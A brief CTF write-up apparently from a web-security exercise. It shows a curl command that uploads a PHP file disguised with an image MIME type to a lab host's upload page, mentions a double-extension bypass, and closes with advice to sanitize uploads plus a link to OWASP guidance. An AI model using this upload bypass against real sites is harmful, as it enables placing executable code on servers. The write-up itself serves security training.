### CTF
```bash
    curl -v -F "Upload=Upload" -F "uploaded=@./test.php;type=image/jpg" http://172.20.10.4/\?page\=upload
```
Alternatively, upload a file in the likes of "test.jpg.jpg".

### How to protect yourself

Sanitize every files of the expected type. You can't just trust the user to fill the file with the wanted extensions.  
I don't want to take credit for the sanitizing solutions I found, you can find them [here](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Protect_FileUpload_Against_Malicious_File.md).

